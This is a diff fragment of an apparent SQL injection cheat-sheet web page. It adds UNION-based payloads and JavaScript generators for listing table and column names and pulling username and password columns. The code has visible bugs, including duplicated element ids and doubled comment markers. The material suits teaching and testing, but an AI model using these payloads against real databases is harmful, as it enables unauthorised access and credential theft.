+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
+              <div class="content">
+                <h3>Union Dump Table Names</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-5"
+                      value="1' UNION SELECT * FROM information_schema.tables WHERE table_name = 'Users'--" readonly />
+                    <label for="Union-Query-5">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-5">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="TableName" class="input-group-text">Table Name:</label>
+                      <input type="text" id="TableName" class="form-control" placeholder="e.g., Users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-5" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-5">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="generate-query-btn" type="button" onclick="generateUnionInfoSchemaTable()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT * FROM information_schema.tables WHERE table_name = 'Users'-- :</strong>
+                    This query
+                    attempts to perform a Union Select Injection by appending a UNION SELECT statement to retrieve all
+                    columns from
+                    the 'information_schema.tables' table, filtered by the specified table name.</br></br>
+                    The user can input the table name and select a comment type to be appended to the injection query,
+                    allowing for
+                    customization based on the SQL dialect being targeted.
+                  </p>
+                </div>
               </div>
 
               <div class="content">
-                <h3>Heading 3</h3>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Facilis
-                  deserunt consequuntur unde aperiam deleniti amet.
-                </p>
-                <p>
-                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Nisi sed
-                  iure perferendis deleniti possimus consequatur ducimus officia sunt
-                  minima amet!
-                </p>
+                <h3>Union Select Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-6"
+                      value="1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--"
+                      readonly />
+                    <label for="Union-Query-6">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-6">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="TableName" class="input-group-text">Table Name:</label>
+                      <input type="text" id="TableName" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-6" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-6">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="generate-query-btn" type="button" onclick="generateUnionInfoSchemaColumn()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--
+                      :</strong> This
+                    query attempts to perform a Union Select Injection by appending a UNION SELECT statement to retrieve
+                    column names
+                    from the 'information_schema.columns' table, filtered by the specified table name.</br></br>
+                    The user can input the table name and select a comment type to be appended to the injection query,
+                    allowing for
+                    customization based on the SQL dialect being targeted.
+                  </p>
+                </div>
+              </div>
+
+              <script>
+                function generateUnionInfoSchemaColumn() {
+                  var tableName = document.getElementById('TableName').value.trim();
+                  var commentOption = document.getElementById('comment-options-6').value;
+
+                  if (tableName === '') {
+                    alert('Please enter the table name.');
+                    return;
+                  }
+
+                  var unionQuery = "1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = '" + tableName + "'--" + commentOption;
+                  document.getElementById('Union-Query-6').value = unionQuery;
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
+
+              <div class="content">
+                <h3>Union Exfiltrate 1</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-3"
+                      value="1' UNION SELECT column1, column2 FROM users--" readonly />
+                    <label for="Union-Query-3">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-3">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE1-Column1" class="input-group-text">Column 1:</label>
+                      <input type="text" id="UE1-Column1" class="form-control" placeholder="e.g., username">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE1-Column2" class="input-group-text">Column 2:</label>
+                      <input type="text" id="UE1-Column2" class="form-control" placeholder="e.g., password">
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE1-Table" class="input-group-text">Table Name:</label>
+                      <input type="text" id="UE1-Table" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-3" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-3">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="generate-query-btn" type="button" onclick="generateUnionExfiltrate1()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' UNION SELECT username, password FROM users-- :</strong> This query attempts to perform a
+                    Union Select Injection by appending a UNION SELECT statement with the specified columns from the
+                    specified table, commonly used to retrieve sensitive information such as usernames and
+                    passwords.</br></br>
+                    The user can input the table name and the names of the columns to be included in the UNION SELECT
+                    statement, allowing for customization of the injection query to fetch desired data.
+                  </p>
+                </div>
               </div>
 
               <div class="content">
@@ -173,7 +1011,7 @@
         </div>
       </div>
     </div>
-    <!-- Authentication Bypass end -->
+    <!-- Union Injection end -->
 
     <!-- footer -->
     <div class="btm light footer">
